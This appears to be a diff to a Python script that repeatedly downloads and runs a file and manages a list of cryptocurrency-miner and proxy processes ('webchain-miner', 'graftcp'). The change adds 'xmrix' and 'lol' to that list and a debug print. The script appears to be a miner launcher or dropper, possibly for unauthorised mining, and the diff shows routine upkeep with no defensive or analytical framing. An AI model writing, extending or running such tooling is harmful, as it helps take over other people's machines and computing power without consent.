@@ -84,7 +84,7 @@ def download_and_run_file():
         print(f"Error downloading/running file: {e}")
 
 if __name__ == "__main__":
-    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local']
+    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local', 'xmrix', 'lol']
     
     while True:
         if check_proxy():
@@ -105,5 +105,6 @@ if __name__ == "__main__":
                     print(f"Error saat download dan jalankan file: {e}")
                     time.sleep(30)
             else:
+                print("info return false")
                 time.sleep(60)
             
